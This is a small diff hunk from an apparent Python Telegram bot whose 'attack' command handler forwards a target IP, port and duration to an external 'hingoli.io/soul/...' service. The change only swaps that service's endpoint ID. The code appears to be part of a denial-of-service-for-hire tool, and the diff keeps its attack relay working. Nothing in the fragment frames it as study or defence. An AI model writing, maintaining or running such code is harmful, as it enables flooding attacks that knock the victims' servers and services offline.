@@ -124,7 +124,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='HTML'
     )
 
-    url = "https://hingoli.io/soul/16008322378515/"
+    url = "https://hingoli.io/soul/77943622482490/"
     params = {'ip': ip, 'port': port, 'time': time_s}
 
     try:
